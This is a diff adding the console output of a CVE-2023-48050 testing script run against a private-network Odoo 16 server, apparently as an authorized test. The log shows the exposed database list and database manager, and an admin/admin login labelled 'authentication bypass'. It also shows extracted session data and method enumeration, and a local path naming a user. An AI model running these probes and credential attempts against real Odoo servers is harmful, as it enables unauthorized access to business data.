@@ -1,0 +1,70 @@
+============================================================
+CVE-2023-48050 SECURITY TESTER
+FOR AUTHORIZED TESTING ONLY
+============================================================
+ 
+Do you have authorization to test http://10.6.23.8:9093? (yes/no): yes
+[*] Testing target: http://10.6.23.8:9093
+[*] Checking endpoint: http://10.6.23.8:9093/web/database/list
+[!] VULNERABLE: Database list exposed at http://10.6.23.8:9093/web/database/list
+    Databases found: ['odoo_db16']
+[*] Checking endpoint: http://10.6.23.8:9093/jsonrpc
+[*] Checking endpoint: http://10.6.23.8:9093/web/database/manager
+[!] WARNING: Database manager accessible at http://10.6.23.8:9093/web/database/manager
+ 
+============================================================
+SECURITY TEST REPORT - CVE-2023-48050
+============================================================
+ 
+[!] CRITICAL: System appears VULNERABLE to CVE-2023-48050
+    1 vulnerable endpoint(s) found
+ 
+RECOMMENDATIONS:
+1. Update Odoo to the latest patched version immediately
+2. Implement proper access controls on database operations
+3. Disable database manager in production environments
+4. Review and restrict JSON-RPC access
+ 
+Detailed Results:
+  - /web/database/list: VULNERABLE
+    Details: ['odoo_db16']
+  - /web/database/manager: WARNING
+PS C:\Users\laura.bernardy\OneDrive - University of Luxembourg\Desktop> python3 cve_2023_48050_exploit.py http://10.6.23.8:9093
+============================================================
+CVE-2023-48050 ENHANCED SECURITY TESTER
+FOR AUTHORIZED TESTING ONLY
+============================================================
+ 
+Do you have authorization to test the target? (yes/no): yes
+Enter target URL (e.g., http://10.6.23.8:9093): http://10.6.23.8:9093
+ 
+[*] Starting enhanced security test on: http://10.6.23.8:9093
+[*] Checking database list exposure: http://10.6.23.8:9093/web/database/list
+[!] VULNERABLE: Database list exposed
+    Databases found: ['odoo_db16']
+ 
+[*] Attempting user enumeration on database: odoo_db16
+[*] Attempting authentication bypass on odoo_db16
+[!] CRITICAL: Authentication bypass successful!
+    Payload: {'db': 'odoo_db16', 'login': 'admin', 'password': 'admin'}
+[+] Session Information Extracted:
+    uid: 2
+    username: admin
+    name: Mitchell Admin
+    company_id: 1
+    user_companies: {'current_company': 1, 'allowed_companies': {'2': {'id': 2, 'name': 'My Company (Chicago)', 'sequence': 10}, '1': {'id': 1, 'name': 'YourCompany', 'sequence': 0}}}
+    db: odoo_db16
+[*] Attempting to enumerate models on odoo_db16
+[*] Checking public methods on odoo_db16
+  [+] Method 'version' accessible
+      Version info: {'server_version': '16.0', 'server_version_info': [16, 0, 0, 'final', 0, ''], 'server_serie': '16.0', 'protocol_version': 1}
+  [+] Method 'about' accessible
+ 
+============================================================
+ENHANCED SECURITY TEST REPORT - CVE-2023-48050
+============================================================
+Target: http://10.6.23.8:9093
+Test Date: 2026-01-12 13:57:05
+ 
+[!] CRITICAL VULNERABILITIES FOUND:
+  - database_list: ['odoo_db16']
